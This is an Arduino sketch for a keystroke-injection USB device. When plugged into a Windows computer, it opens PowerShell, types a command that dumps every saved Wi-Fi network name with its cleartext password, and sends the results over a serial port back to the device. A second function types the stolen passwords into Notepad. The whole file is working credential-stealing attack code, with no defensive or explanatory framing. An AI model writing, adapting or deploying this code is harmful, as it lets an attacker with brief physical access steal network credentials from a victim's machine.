#include "Keyboard.h"
int betweenTypingDelay = 500;
int pressReleaseDelay = 20;

void getWifiPasswords(){
  // Open Powershell
  Keyboard.press(KEY_LEFT_GUI);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_LEFT_GUI);
  delay(betweenTypingDelay);
  Keyboard.print("powershell");
  delay(betweenTypingDelay);
  Keyboard.press(KEY_RETURN);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_RETURN);
  delay(betweenTypingDelay);
  
  // Type Wifi Script
  Keyboard.print("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Out-String -OutVariable myVar");
  Keyboard.press(KEY_RETURN);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_RETURN);
  delay(betweenTypingDelay);
  Keyboard.print("$myVarA = $myVar.Replace(\"-\",\"\")");
  Keyboard.press(KEY_RETURN);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_RETURN);
  delay(betweenTypingDelay);

  //Write to Serial Port
  //Arduino Needs to be within the first 10 COM ports
  for(int x =0 ; x <10; x++){
    Keyboard.print("$test = new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print(x);
    Keyboard.print(",9600,None,8,one");
    Keyboard.press(KEY_RETURN);
    delay(pressReleaseDelay);
    Keyboard.release(KEY_RETURN);
    delay(betweenTypingDelay);
    Keyboard.print("$test.Open()");
    Keyboard.press(KEY_RETURN);
    delay(pressReleaseDelay);
    Keyboard.release(KEY_RETURN);
    delay(betweenTypingDelay);
    Keyboard.print("$test.Write(\"$myVarA\")");
    Keyboard.press(KEY_RETURN);
    delay(pressReleaseDelay);
    Keyboard.release(KEY_RETURN);
    delay(betweenTypingDelay);
    Keyboard.print("$test.Close()");
    Keyboard.press(KEY_RETURN);
    delay(pressReleaseDelay);
    Keyboard.release(KEY_RETURN);
    delay(betweenTypingDelay);
  }
}

void writeWifiPasswords(char passwords[999]){
  // Place Code for the action the button preforms here
  Keyboard.press(KEY_LEFT_GUI);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_LEFT_GUI);
  delay(betweenTypingDelay);
  Keyboard.print("notepad");
  delay(betweenTypingDelay);
   Keyboard.press(KEY_RETURN);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_RETURN);
  delay(betweenTypingDelay);
  Keyboard.print(passwords);
  Keyboard.press(KEY_RETURN);
  delay(pressReleaseDelay);
  Keyboard.release(KEY_RETURN);
}
